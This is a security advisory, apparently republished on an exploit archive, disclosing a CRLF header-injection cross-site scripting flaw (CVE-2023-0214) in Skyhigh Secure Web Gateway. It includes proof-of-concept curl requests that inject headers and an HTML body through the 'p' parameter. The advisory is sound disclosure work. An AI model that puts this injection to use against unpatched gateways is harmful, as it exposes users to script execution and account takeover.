@@ -1,0 +1,197 @@
+id: 38471
+date: 04/05/2023
+title: Secure Web Gateway 10.2.11 - Cross-Site Scripting Vulnerability
+author: RedTeam
+cves: CVE-2023-0214
+
+Exploit Title: Secure Web Gateway 10.2.11 - Cross-Site Scripting (XSS)
+Product: Secure Web Gateway
+Affected Versions: 10.2.11, potentially other versions
+Fixed Versions: 10.2.17, 11.2.6, 12.0.1
+Vulnerability Type: Cross-Site Scripting
+Security Risk: high
+Vendor URL: https://www.skyhighsecurity.com/en-us/products/secure-web-gateway.html
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2022-002
+Advisory Status: published
+CVE: CVE-2023-0214
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0214
+
+
+Introduction
+============
+
+"Skyhigh Security Secure Web Gateway (SWG) is the intelligent,
+cloud-native web security solution that connects and secures your
+workforce from malicious websites and cloud apps—from anywhere, any
+application, and any device."
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+The Secure Web Gateway's (SWG) block page, which is displayed when a
+request or response is blocked by a rule, can contain static files such
+as images, stylesheets or JavaScript code. These files are embedded
+using special URL paths. Consider the following excerpt of a block page:
+
+------------------------------------------------------------------------
+<html>
+<!-- FileName: index.html
+     Language: [en]
+-->
+<!--Head-->
+<head>
+  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+  <meta http-equiv="X-UA-Compatible" content="IE=7" />
+  <title>McAfee Web Gateway - Notification</title>
+  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
+  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/default/stylesheet.css" />
+</head>
+------------------------------------------------------------------------
+
+Static content is loaded from URL paths prefixed with
+"/mwg-internal/de5fs23hu73ds/". It was discovered that paths with this
+prefix are intercepted and directly handled by the SWG no matter on
+which domain they are accessed. While the prefix can be configured in
+the SWG, attackers can also obtain it using another currently
+undisclosed vulnerability.
+
+By reverse engineering the file "libSsos.so" and analysing JavaScript
+code, it was possible to derive the API of the "Ssos" plugin's
+"SetLoginToken" action. Through the following call using the
+command-line HTTP client curl, the behaviour of the plugin was further
+analysed:
+
+------------------------------------------------------------------------
+$ curl --proxy http://192.168.1.1:8080 -i 'https://gateway.example.com/mwg-internal/de5fs23hu73ds/plugin?target=Ssos&action=SetLoginToken&v=v&c=c&p=p'
+HTTP/1.0 200 OK
+P3P: p
+Connection: Keep-Alive
+Set-Cookie: MwgSso=v; Path=/; Max-Age=240;
+Content-Type: application/javascript
+Content-Length: 2
+X-Frame-Options: deny
+
+c;
+------------------------------------------------------------------------
+
+The response embeds the values of the three URL parameters "v", "c" and
+"p". The value for "p" is embedded as value of the "P3P" header, the
+value of "c" as the response body and the value of "v" as the value
+of the cookie "MwgSso".
+
+It is also possible to include newline or carriage return characters in
+the parameter value which are not encoded in the output. Consequently,
+if the value of the parameter "p" contains a line break, arbitrary
+headers can be injected. If two line breaks follow, an arbitrary body
+can be injected. If a suitable "Content-Length" header is injected, the
+remaining headers and body of the original response will be ignored by
+the browser. This means that apart from the initial "P3P" header, an
+arbitrary response can be generated. For example, a page containing
+JavaScript code could be returned, resulting in a cross-site scripting
+attack.
+
+Consequently, attackers can construct URL paths that can be appended to
+any domain and cause an arbitrary response to be returned if the URL is
+accessed through the SWG. This could be exploited by distributing such
+URLs or even by offering a website which performs an automatic redirect
+to any other website using such a URL. As a result, the SWG exposes its
+users to self-induced cross-site scripting vulnerabilities in any
+website.
+
+
+Proof of Concept
+================
+
+In the following request, the "p" parameter is used to inject suitable
+"Content-Type" and "Content-Length" headers, as well as an arbitrary
+HTML response body.
+
+------------------------------------------------------------------------
+$ curl --proxy http://192.168.1.1:8080 'https://gateway.example.com/mwg-internal/de5fs23hu73ds/plugin?target=Ssos&action=SetLoginToken&v=v&c=c&p=p%0aContent-Type: text/html%0aContent-Length: 27%0a%0a<h1>RedTeam Pentesting</h1>'
+HTTP/1.0 200 OK
+P3P: p
+Content-Type: text/html
+Content-Length: 27
+
+<h1>RedTeam Pentesting</h1>
+------------------------------------------------------------------------
+
+As mentioned above, the HTTP response body could also include JavaScript
+code designed to interact with the domain specified in the URL resulting
+in a cross-site scripting vulnerability.
+
+
+Workaround
+==========
+
+None.
+
+
+Fix
+===
+
+According to the vendor, the vulnerability is mitigated in versions
+10.2.17, 11.2.6 and 12.0.1 of the Secure Web Gateway. This was not
+verified by RedTeam Pentesting GmbH. The vendor's security bulletin can
+be found at the following URL:
+
+https://kcm.trellix.com/corporate/index?page=content&id=SB10393
+
+
+Security Risk
+=============
+
+The vulnerability could be used to perform cross-site scripting attacks
+against users of the SWG in context of any domain. Attackers only need
+to convince users to open a prepared URL or visit an attacker's website
+that could perform an automatic redirect to an exploit URL. This exposes
+any website visited through the SWG to the various risks and
+consequences of a cross-site scripting vulnerability such as account
+takeover. As a result, this vulnerability poses a high risk.
+
+
+Timeline
+========
+
+2022-07-29 Vulnerability identified
+2022-10-20 Customer approved disclosure to vendor
+2022-10-20 Vulnerability was disclosed to the vendor
+2023-01-17 Patch released by vendor for versions 10.2.17, 11.2.6 and
+           12.0.1.
+2023-01-26 Detailed advisory released by RedTeam Pentesting GmbH
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
+
+
+Working at RedTeam Pentesting
+=============================
+
+RedTeam Pentesting is looking for penetration testers to join our team
+in Aachen, Germany. If you are interested please visit:
+https://jobs.redteam-pentesting.de/
+
+-- 
+RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
+Alter Posthof 1                           Fax : +49 241 510081-99
+52062 Aachen                    https://www.redteam-pentesting.de
+Germany                         Registergericht: Aachen HRB 14004
+Geschäftsführer:                       Patrick Hof, Jens Liebchen
+
+#  0day.today [2023-04-19]  #
